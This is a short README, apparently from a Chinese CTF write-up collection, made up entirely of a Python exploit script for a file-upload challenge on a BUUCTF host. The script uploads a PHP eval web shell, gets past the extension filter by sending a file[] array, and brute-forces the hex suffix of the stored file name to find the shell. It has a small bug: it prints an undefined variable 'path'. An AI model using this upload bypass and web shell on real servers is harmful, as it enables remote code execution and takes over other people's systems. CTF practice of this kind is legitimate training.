# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/文件上传/README.md
# TITLE: 文件上传
# CATEGORY: web

import requests
import os
session = requests.session()
url = 'http://bfe57cc0-6949-4a5d-89b9-ec52e0ac2696.node4.buuoj.cn:81/index.php/home/index/upload'
file1 = {'file': ('1.txt', '<?php eval($_GET["cmd"]);')}
# upload()不传参时即是批量上传所以用[]
file2 = {'file[]': ('1.php', '<?php eval($_GET["cmd"]);')}
# os.open
r = session.post(url, files=file1)
print(r.text)
# start = r.text[-30]
r = session.post(url, files=file2)
print(r.text)

r = session.post(url, files=file1)
print(r.text)
print(r.text[-31:-23])
all = r.text[-31:-23]
s = "1234567890abcdef"
for a in s:
    for b in s:
        for c in s:
            for d in s:
                for e in s:
                    url_new = 'http://bfe57cc0-6949-4a5d-89b9-ec52e0ac2696.node4.buuoj.cn:81//Public/Uploads/2022-02-25/' + \
                        all+a+b+c+d+e+".php"
                    # print(url_new)
                    r = requests.get(url_new)
                    if r.status_code == 200:
                        print(path)
                        # print(r.text)
                        break
